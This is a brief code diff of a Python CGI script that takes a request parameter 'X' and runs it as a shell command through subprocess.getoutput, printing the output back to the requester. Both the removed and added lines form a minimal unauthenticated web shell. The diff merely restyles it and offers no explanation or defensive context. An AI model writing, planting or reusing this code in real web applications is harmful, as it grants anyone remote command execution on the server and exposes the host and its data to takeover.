@@ -7,5 +7,6 @@ print()
 
 fields = cgi.FieldStorage()
 cmd = fields.getvalue("X")
-from subprocess import getoutput
-print(getoutput(cmd))
+import subprocess as sp
+output = sp.getoutput(cmd)
+print(output)
